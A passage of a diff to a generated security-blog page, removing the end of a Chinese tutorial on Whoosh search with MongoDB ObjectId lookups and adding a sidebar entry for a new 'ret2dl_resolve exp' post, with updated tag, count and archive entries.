client[<span class="hljs-string">'xxx'</span>]</span><br><span class="line">collections = db[<span class="hljs-string">'xxx'</span>]</span><br><span class="line"></span><br><span class="line">ix = open_dir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)    <span class="hljs-comment">#打开索引文件</span></span><br><span class="line"><span class="hljs-keyword">with</span> ix.searcher() <span class="hljs-keyword">as</span> searcher:</span><br><span class="line">    query = MultifieldParser([<span class="hljs-string">"title"</span>, <span class="hljs-string">"content"</span>], ix.schema).parse(<span class="hljs-string">"xss"</span>)</span><br><span class="line">    <span class="hljs-comment">#query = QueryParser("content", ix.schema).parse("xss")</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># 排序</span></span><br><span class="line">    mf = sorting.MultiFacet()</span><br><span class="line">    mf.add_field(<span class="hljs-string">"date"</span>, reverse=<span class="hljs-keyword">True</span>)</span><br><span class="line">    results = searcher.search(query, limit=<span class="hljs-number">10</span>, sortedby=mf)</span><br><span class="line">    print(len(results))</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> results:</span><br><span class="line">        _id = ObjectId(one[<span class="hljs-string">'nid'</span>])      <span class="hljs-comment"># 将字符串构造成 ObjectId</span></span><br><span class="line">        res = collections.find(&#123;<span class="hljs-string">'_id'</span>:_id&#125;)[<span class="hljs-number">0</span>]</span><br><span class="line">        print(res[<span class="hljs-string">'date'</span>] + res[<span class="hljs-string">'title'</span>])</span><br><span class="line">        print(<span class="hljs-string">'-----------------------\n'</span>)</span><br><span class="line">        count += <span class="hljs-number">1</span></span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;<code>MultifieldParser</code>是搜索多个field，也就是多个字段，而<code>QueryParser</code>只能搜索一个字段。<code>sorting.MultiFacet()</code>是whoosh中实现排序的一种方法，<code>reverse=True</code>是反向排序，这里实现的是时间降序。<code>searcher.search(sortedby=mf)</code>指定排序方式。其实whoosh里提供多种排序方法，功能还挺全面。</p>
-<p>&emsp;&emsp;这里提供了mongodb如何使用<code>_id</code>查找的方法。</p>
-<p>&emsp;&emsp;如果需要将<code>_id</code>中的值提取出来，则使用：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_id = collections.insert(dict(item))</span><br><span class="line">nid=_id.__str__()</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;如果需要使用字符串查找，则使用：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> bson.objectid <span class="hljs-keyword">import</span> ObjectId</span><br><span class="line"></span><br><span class="line">_id = ObjectId(one[<span class="hljs-string">'nid'</span>])      <span class="hljs-comment"># 将字符串构造成 ObjectId</span></span><br><span class="line">res = collections.find(&#123;<span class="hljs-string">'_id'</span>:_id&#125;)[<span class="hljs-number">0</span>]</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;完整的事例可查看<a href="https://github.com/DelCoding/MyCodes/blob/master/whoosh.py" target="_blank" rel="noopener">此页面</a></p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
 
     
 <div class="card card-transparent">
@@ -844,7 +867,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        61
+                        62
                     </p>
                 </div>
             </div>
@@ -864,7 +887,7 @@
                         标签
                     </p>
                     <p class="title has-text-weight-normal">
-                        22
+                        23
                     </p>
                 </div>
             </div>
@@ -959,7 +982,7 @@
         <h3 class="menu-label">
             标签云
         </h3>
-        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/ret2dl-resolve/" style="font-size: 10px;">ret2dl_resolve</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
     </div>
 </div>
 
@@ -973,6 +996,25 @@
         <h3 class="menu-label">
             最新文章
         </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/01/ret2dl_resolve_x86/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve exp">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-01-01T16:00:00.000Z">2019-01-02</time></div>
+                    <a href="/2019/01/ret2dl_resolve_x86/" class="has-link-black-ter is-size-6">ret2dl_resolve exp</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -1050,25 +1092,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/11/bctf2018-eosgame-writeup/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 EOSGame Study">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-29T13:40:56.000Z">2018-11-29</time></div>
-                    <a href="/2018/11/bctf2018-eosgame-writeup/" class="has-link-black-ter is-size-6">BCTF2018 EOSGame Study</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1080,6 +1103,17 @@
             归档
         </h3>
         <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
         
         <li>
             <a class="level is-marginless" href="/archives/2018/12/">
@@ -1243,7 +1277,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">17</span>
+                            <span class="level-item tag">18</span>
                         </span>
                     </a>
                 </li>
@@ -1354,6 +1388,17 @@
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/ret2dl-resolve/">
+                        <span class="level-start">
+                            <span class="level-item">ret2dl_resolve</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
                         </span>
                     </a>
                 </li>
@@ -1492,6 +1537,25 @@
         
         <article class="media">
             
+            <a href="/2019/01/ret2dl_resolve_x86/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve exp">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-01-01T16:00:00.000Z">2019-01-02</time></div>
+                    <a href="/2019/01/ret2dl_resolve_x86/" class="has-link-black-ter is-size-6">ret2dl_resolve exp</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
             <a href="/2018/12/dl_runtime_resolve/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt之_dl_runtime_resolve">
@@ -1566,25 +1630,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/11/bctf2018-eosgame-writeup/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 EOSGame Study">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-29T13:40:56.000Z">2018-11-29</time></div>
-                    <a href="/2018/11/bctf2018-eosgame-writeup/" class="has-link-black-ter is-size-6">BCTF2018 EOSGame Study</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1596,6 +1641,17 @@
             归档
         </h3>
         <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
         
         <li>
             <a class="level is-marginless" href="/archives/2018/12/">
@@ -1759,7 +1815,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">17</span>
+                            <span class="level-item tag">18</span>
                         </span>
                     </a>
                 </li>
@@ -1870,6 +1926,17 @@
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/ret2dl-resolve/">
+                        <span class="level-start">
+                            <span class="level-item">ret2dl_resolve</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
                         </span>
                     </a>
                 </li>
@@ -2005,7 +2072,7 @@
                 
                 </a>
                 <p class="is-size-7">
-                &copy; 2018 Junay&nbsp;
+                &copy; 2019 Junay&nbsp;
                 Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                         href="http://github.com/ppoffice/hexo-theme-icarus">Icarus</a>
                 </p>
